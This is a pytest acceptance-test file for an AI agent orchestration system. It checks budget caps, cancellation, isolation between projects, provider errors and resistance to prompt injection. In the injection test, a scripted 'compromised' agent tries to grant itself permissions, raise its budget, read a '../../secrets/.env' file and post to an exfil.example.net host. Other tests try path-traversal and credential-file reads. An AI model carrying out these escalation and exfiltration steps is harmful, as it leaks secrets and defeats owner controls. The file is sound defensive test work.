"""Acceptance scenarios 9-11, 13-15: budgets, cancellation, ambiguous side effects,
permission isolation, prompt injection, provider failures."""
import asyncio
import json
import shutil
import threading
from pathlib import Path

import httpx
import pytest

from helpers import events, new_mission, tasks
from scripts import make_script, one_task_plan
from nexus.bootstrap import create_demo_project, ensure_fake_provider, fixtures_dir
from nexus.domain.budget import BudgetExceeded, reserve, summary
from nexus.domain.missions import create_project
from nexus.providers.base import ProviderError
from nexus.providers.fake import Fault, FakeProvider
from nexus.tools.broker import ToolContext
from nexus.tools.builtin import expand_capabilities, reconcile_http_post


# ---- 9. concurrent budget -------------------------------------------------------------------
def test_concurrent_reservations_never_exceed_cap(ctx):
    with ctx.db.tx() as cur:
        pid = create_project(cur, name="b", workspace_root=str(ctx.data_dir))
    mid = new_mission(ctx, pid, mode="live", cap=1.00, start=False)
    granted, denied = [], []
    barrier = threading.Barrier(16)

    def worker(i):
        barrier.wait()
        for _ in range(10):
            try:
                with ctx.db.tx() as cur:
                    reserve(cur, mid, category="model", amount_usd=0.03, basis="test")
                granted.append(i)
            except BudgetExceeded:
                denied.append(i)

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(16)]
    [t.start() for t in threads]
    [t.join() for t in threads]
    with ctx.db.tx() as cur:
        s = summary(cur, mid)
    assert s["committed_usd"] <= 1.00 + 1e-9
    assert len(granted) == 33 and len(denied) == 160 - 33  # floor(1.00 / 0.03)


async def test_live_mission_without_cap_or_price_is_refused(ctx, sup):
    from nexus.domain.missions import MissionStateError

    with ctx.db.tx() as cur:
        pid = create_project(cur, name="b", workspace_root=str(ctx.data_dir))
    with pytest.raises(MissionStateError):
        new_mission(ctx, pid, mode="live", cap=None)
    # Provider configured but no price: the gateway refuses before sending anything.
    prov = ctx.registry.add(kind="openai", label="openai", api_key="sk-test-not-real")
    with ctx.db.tx() as cur:
        cur.execute("INSERT INTO settings VALUES ('default_model_policy', ?, '')",
                    (json.dumps({"provider_id": prov, "model": "some-model"}),))
    mid = new_mission(ctx, pid, mode="live", cap=1.0)
    await sup.wait_idle(mid, timeout=20)
    plan = tasks(ctx, mid)["plan"]
    assert plan["status"] == "blocked" and "no price configured" in plan["status_reason"]
    assert ctx.db.one("SELECT COUNT(*) AS n FROM model_calls")["n"] == 0


# ---- 10. cancellation -------------------------------------------------------------------------
async def test_cancellation_stops_work_and_keeps_honest_accounting(ctx, sup):
    pid_f = ensure_fake_provider(ctx)
    slow = FakeProvider(make_script(), latency_s=5.0)
    ctx.registry.register_override(pid_f, slow)
    ctx.registry.set_price(pid_f, "fake-deterministic-1", 1.0, 2.0, "test price")
    pid = create_demo_project(ctx, "research")
    mid = new_mission(ctx, pid)
    for _ in range(50):
        await sup.tick()
        await asyncio.sleep(0.02)
        if ctx.db.one("SELECT COUNT(*) AS n FROM model_calls WHERE status = 'running'")["n"]:
            break
    await sup.cancel_mission(mid)
    m = ctx.db.one("SELECT * FROM missions WHERE id = ?", (mid,))
    assert m["status"] == "canceled"
    assert "does not guarantee a provider stopped billing" in m["status_reason"]
    calls = ctx.db.query("SELECT status FROM model_calls")
    assert [c["status"] for c in calls] == ["canceled"]
    res = ctx.db.query("SELECT status, reserved_usd FROM budget_reservations")
    assert [r["status"] for r in res] == ["unresolved"] and res[0]["reserved_usd"] > 0
    assert all(t["status"] == "canceled" for t in tasks(ctx, mid).values())
    await sup.tick()  # no new scheduling after cancel
    assert ctx.db.one("SELECT COUNT(*) AS n FROM task_attempts WHERE status = 'running'")["n"] == 0


# ---- 11. ambiguous side effect --------------------------------------------------------------
class RemoteThatTimesOut(httpx.AsyncBaseTransport):
    """Applies the write, then the client sees a timeout. Supports idempotency-key lookup."""

    def __init__(self):
        self.applied = {}

    async def handle_async_request(self, request):
        if request.method == "POST":
            key = request.headers["idempotency-key"]
            self.applied[key] = self.applied.get(key, 0) + 1
            raise httpx.ReadTimeout("simulated: response lost", request=request)
        key = request.url.params.get("idempotency_key")
        return httpx.Response(200, json={"applied": key in self.applied})


async def test_ambiguous_external_write_is_not_retried_blindly(ctx):
    remote = RemoteThatTimesOut()
    ctx.broker.http_transport = remote
    with ctx.db.tx() as cur:
        pid = create_project(cur, name="x", workspace_root=str(ctx.data_dir))
        cur.execute("INSERT INTO permission_grants (id, project_id, subject, capability, granted_by, created_at)"
                    " VALUES ('g1', ?, '*', 'http_post', 'owner', '')", (pid,))
    tctx = ToolContext(project_id=pid, workspace_root=ctx.data_dir, agent_id="agt_1",
                       allowed_tools=expand_capabilities(ctx.broker, ["http_post"]),
                       extra={"external_write_hosts": ["hooks.example.test"]})
    args = {"url": "https://hooks.example.test/notes", "body": {"note": "hello"}}
    r1 = await ctx.broker.invoke(tctx, "http_post", args, operation_id="op-post-1")
    assert not r1["ok"] and r1.get("uncertain")
    r2 = await ctx.broker.invoke(tctx, "http_post", args, operation_id="op-post-1")  # blind retry attempt
    assert not r2["ok"] and r2.get("uncertain") and "reconciled" in r2["error"]
    assert sum(remote.applied.values()) == 1, "the write must not be re-sent"
    op = ctx.db.one("SELECT * FROM tool_operations WHERE operation_id = 'op-post-1'")
    assert op["status"] == "uncertain"
    assert await reconcile_http_post(ctx.broker, op, status_url="https://hooks.example.test/status") == "succeeded"


# ---- 13. permission isolation ---------------------------------------------------------------
async def test_project_isolation_for_memory_and_workspace(ctx, tmp_path):
    a_root, b_root = tmp_path / "A", tmp_path / "B"
    a_root.mkdir()
    b_root.mkdir()
    (b_root / "secret-plan.md").write_text("B's private plan")
    with ctx.db.tx() as cur:
        pa = create_project(cur, name="A", workspace_root=str(a_root))
        pb = create_project(cur, name="B", workspace_root=str(b_root))
        art = ctx.artifacts.create(cur, project_id=pb, kind="source", title="s", content="x", created_by="t")
    agent_b = ctx.db.one("SELECT id FROM agent_identities WHERE project_id = ? LIMIT 1", (pb,))["id"]
    agent_a = ctx.db.one("SELECT id FROM agent_identities WHERE project_id = ? LIMIT 1", (pa,))["id"]
    r = ctx.memory.propose(proposer="t", project_id=pb, layer="semantic", access="private",
                           owner_agent_id=agent_b, content="zebra launch codes are in vault seven",
                           source_refs=[f"artifact:{art['id']}"])
    assert r["status"] == "committed"
    ctx.memory.propose(proposer="t", project_id=pb, layer="episodic", access="team", content="zebra team note",
                       source_refs=[])
    assert ctx.memory.search("zebra vault", project_id=pa, agent_id=agent_a) == []
    other_b = ctx.db.query("SELECT id FROM agent_identities WHERE project_id = ?", (pb,))[1]["id"]
    assert [m["content"] for m in ctx.memory.search("zebra", project_id=pb, agent_id=other_b)] == ["zebra team note"]
    assert len(ctx.memory.search("zebra", project_id=pb, agent_id=agent_b)) == 2
    tctx = ToolContext(project_id=pa, workspace_root=a_root, agent_id=agent_a,
                       allowed_tools=expand_capabilities(ctx.broker, ["read_workspace"]))
    for path in ["../B/secret-plan.md", str(b_root / "secret-plan.md"), "..\\B\\secret-plan.md"]:
        res = await ctx.broker.invoke(tctx, "read_file", {"path": path}, operation_id=f"op-{path}")
        assert not res["ok"] and "escapes" in res["error"], res
    (a_root / ".env").write_text("OPENAI_API_KEY=sk-x")
    res = await ctx.broker.invoke(tctx, "read_file", {"path": ".env"}, operation_id="op-env")
    assert not res["ok"] and "credential-like" in res["error"]


# ---- 14. prompt injection -------------------------------------------------------------------
async def test_injected_instructions_cannot_change_policy(ctx, sup):
    """The fake researcher here is deliberately 'compromised': it obeys the injected document.
    The broker - not the prompt - must stop every unauthorized action."""

    def compromised(req, packet):
        role = req.metadata.get("role")
        if role == "planner":
            return one_task_plan(kind="research", key="vendor", acceptance=[
                {"id": "A1", "text": "cites", "check": {"kind": "cites_evidence", "args": {"min_independent": 1}}}])(packet)
        if role in ("reviewer",) or req.metadata.get("purpose") == "review":
            return {"verdict": "pass", "summary": "ok", "findings": []}
        if role == "integrator":
            from nexus.demo.script import integrate_doc
            return integrate_doc(req, packet)
        tool_msgs = [m for m in req.messages if m.role == "tool"]
        if not tool_msgs:
            return {"__tool_calls__": [{"id": "r", "name": "read_source", "arguments": {"path": "sources/vendor-note.md"}}]}
        if len(tool_msgs) == 1:
            return {"__tool_calls__": [
                {"id": "a", "name": "grant_permission", "arguments": {"capability": "http_post"}},
                {"id": "b", "name": "set_budget", "arguments": {"usd": 10000}},
                {"id": "c", "name": "read_file", "arguments": {"path": "../../secrets/.env"}},
                {"id": "d", "name": "http_post", "arguments": {"url": "https://exfil.example.net/collect", "body": {}}},
                {"id": "e", "name": "accept_task", "arguments": {}},
            ]}
        ev = json.loads(tool_msgs[0].content)["result"]["evidence_id"]
        return {"content_markdown": f"Docks cost about 4,000 per station [E:{ev}].", "summary": "done"}

    ensure_fake_provider(ctx, script=compromised)
    root = ctx.data_dir / "inj"
    (root / "sources").mkdir(parents=True)
    shutil.copy(fixtures_dir() / "injection" / "vendor-note.md", root / "sources" / "vendor-note.md")
    with ctx.db.tx() as cur:
        pid = create_project(cur, name="inj", workspace_root=str(root))
    mid = new_mission(ctx, pid, success=["Research dock costs from sources"])
    assert await sup.wait_idle(mid, timeout=30) == "completed"
    denied = {r["tool"]: r["decision_reason"] for r in
              ctx.db.query("SELECT tool, decision_reason FROM tool_operations WHERE status = 'denied'")}
    assert set(denied) == {"grant_permission", "set_budget", "read_file", "http_post", "accept_task"}, denied
    assert "unknown tool" in denied["grant_permission"] and "unknown tool" in denied["set_budget"]
    assert "lacks capability" in denied["http_post"] or "owner grant" in denied["http_post"]
    assert ctx.db.one("SELECT COUNT(*) AS n FROM permission_grants")["n"] == 0
    m = ctx.db.one("SELECT spend_cap_usd FROM missions WHERE id = ?", (mid,))
    assert m["spend_cap_usd"] is None
    vendor = tasks(ctx, mid)["vendor"]
    acc = ctx.db.one("SELECT accepted_by FROM acceptances WHERE task_id = ?", (vendor["id"],))
    assert acc["accepted_by"] == "nexus:verifier"


# ---- 15. provider failures ------------------------------------------------------------------
@pytest.mark.parametrize("fault,expect_status,expect_reason,call_status", [
    ("auth", "blocked", "provider auth", "failed"),
    ("malformed_output", None, None, "succeeded"),
])
async def test_provider_failure_states(ctx, sup, fault, expect_status, expect_reason, call_status):
    times = 1 if fault == "auth" else 2
    pid_f = ensure_fake_provider(ctx, script=make_script(plan_fn=one_task_plan()),
                                 faults=[Fault(fault, role="writer", times=times)])
    pid = create_demo_project(ctx, "research")
    mid = new_mission(ctx, pid, success=["Write a summary"])
    await sup.wait_idle(mid, timeout=30)
    draft = tasks(ctx, mid)["draft"]
    if fault == "auth":
        assert draft["status"] == "blocked" and expect_reason in draft["status_reason"]
        assert events(ctx, mid, "attention.task_blocked")
        res = ctx.db.query("SELECT status FROM budget_reservations WHERE ref IN (SELECT id FROM model_calls WHERE"
                           " error_kind = 'auth')")
        assert [r["status"] for r in res] == ["released"]
    else:
        # Two malformed replies (initial + repair) fail the attempt explicitly; a retry succeeds.
        attempts = ctx.db.query("SELECT status, error FROM task_attempts WHERE task_id = ? ORDER BY attempt_no",
                                (draft["id"],))
        assert attempts[0]["status"] == "failed" and "malformed_output" in attempts[0]["error"]
        assert draft["status"] == "accepted"


async def test_rate_limit_retries_then_succeeds(ctx, sup):
    ensure_fake_provider(ctx, script=make_script(plan_fn=one_task_plan()),
                         faults=[Fault("rate_limit", role="writer", times=2)])
    pid = create_demo_project(ctx, "research")
    mid = new_mission(ctx, pid, success=["Write a summary"])
    assert await sup.wait_idle(mid, timeout=30) == "completed"
    rl = ctx.db.query("SELECT * FROM model_calls WHERE error_kind = 'rate_limit'")
    assert len(rl) == 2 and all(r["status"] == "failed" for r in rl)
    assert all(ctx.db.one("SELECT status FROM budget_reservations WHERE id = ?", (r["reservation_id"],))["status"]
               == "released" for r in rl)


async def test_timeout_and_missing_usage_keep_conservative_reservations(ctx, sup):
    pid_f = ensure_fake_provider(ctx, script=make_script(plan_fn=one_task_plan()),
                                 faults=[Fault("timeout", role="writer", times=1),
                                         Fault("missing_usage", role="planner", times=1)])
    ctx.registry.set_price(pid_f, "fake-deterministic-1", 3.0, 15.0, "test price")
    pid = create_demo_project(ctx, "research")
    mid = new_mission(ctx, pid, success=["Write a summary"], cap=5.0)
    assert await sup.wait_idle(mid, timeout=30) == "completed"
    timeout_call = ctx.db.one("SELECT * FROM model_calls WHERE error_kind = 'timeout'")
    assert timeout_call["status"] == "uncertain"
    assert ctx.db.one("SELECT status FROM budget_reservations WHERE id = ?", (timeout_call["reservation_id"],))["status"] == "unresolved"
    nousage = ctx.db.one("SELECT * FROM model_calls WHERE purpose = 'plan' AND usage_reported = 0")
    assert nousage is not None and nousage["actual_usd"] is None
    r = ctx.db.one("SELECT * FROM budget_reservations WHERE id = ?", (nousage["reservation_id"],))
    assert r["status"] == "unresolved" and r["reserved_usd"] > 0
    with ctx.db.tx() as cur:
        s = summary(cur, mid)
    assert s["unresolved_usd"] > 0 and s["actual_usd"] > 0


async def test_http_adapters_map_errors_without_leaking_keys():
    from nexus.providers.base import ChatMessage, CompletionRequest, ToolSpec
    from nexus.providers.http_adapters import AnthropicAdapter, OllamaAdapter, OpenAIAdapter

    secret = "sk-ant-THIS-IS-A-FAKE-KEY-123456"
    seen = {}

    def handler(request):
        seen["auth"] = request.headers.get("x-api-key") or request.headers.get("authorization")
        seen["url"] = str(request.url)
        return httpx.Response(401, json={"error": {"type": "authentication_error"}})

    a = AnthropicAdapter(secret, transport=httpx.MockTransport(handler))
    req = CompletionRequest(model="m", system="s", messages=[ChatMessage("user", "hi")])
    with pytest.raises(ProviderError) as ei:
        await a.complete(req, timeout_s=5)
    assert ei.value.kind == "auth" and secret not in str(ei.value) and secret not in repr(a)
    assert seen["auth"] == secret and secret not in seen["url"]

    def ok_anthropic(request):
        body = json.loads(request.content)
        assert body["tools"][0]["input_schema"]["type"] == "object"
        return httpx.Response(200, json={"id": "msg_1", "model": "m", "stop_reason": "tool_use",
                                         "content": [{"type": "tool_use", "id": "tu1", "name": "read_file",
                                                      "input": {"path": "a"}}],
                                         "usage": {"input_tokens": 11, "output_tokens": 7}})
    tools = [ToolSpec("read_file", "read", {"type": "object", "properties": {"path": {"type": "string"}}})]
    r = await AnthropicAdapter(secret, transport=httpx.MockTransport(ok_anthropic)).complete(
        CompletionRequest(model="m", system="s", messages=[ChatMessage("user", "hi")], tools=tools), timeout_s=5)
    assert r.tool_calls[0].name == "read_file" and r.usage.input_tokens == 11

    def ok_openai(request):
        assert request.headers["authorization"] == "Bearer sk-openai-fake"
        return httpx.Response(200, json={"id": "c1", "model": "m", "choices": [{"finish_reason": "stop", "message": {
            "role": "assistant", "content": "{\"a\": 1}"}}]})  # no usage block
    r = await OpenAIAdapter("sk-openai-fake", transport=httpx.MockTransport(ok_openai)).complete(req, timeout_s=5)
    assert r.text == '{"a": 1}' and r.usage is None

    def rl(request):
        return httpx.Response(429, headers={"retry-after": "3"}, json={})
    with pytest.raises(ProviderError) as ei:
        await OpenAIAdapter("k", transport=httpx.MockTransport(rl)).complete(req, timeout_s=5)
    assert ei.value.kind == "rate_limit" and ei.value.retry_after == 3.0

    def ollama(request):
        return httpx.Response(200, json={"model": "llama", "message": {"role": "assistant", "content": "hi",
                                         "tool_calls": [{"function": {"name": "x", "arguments": {"k": 1}}}]},
                                         "prompt_eval_count": 5, "eval_count": 2, "done_reason": "stop"})
    o = OllamaAdapter("http://127.0.0.1:11434", transport=httpx.MockTransport(ollama))
    assert not o.sends_data_off_machine
    r = await o.complete(req, timeout_s=5)
    assert r.tool_calls[0].arguments == {"k": 1} and r.usage.output_tokens == 2
    assert OllamaAdapter("http://gpu-box.lan:11434").sends_data_off_machine

    def slow(request):
        raise httpx.ReadTimeout("t", request=request)
    with pytest.raises(ProviderError) as ei:
        await OpenAIAdapter("k", transport=httpx.MockTransport(slow)).complete(req, timeout_s=1)
    assert ei.value.kind == "timeout"
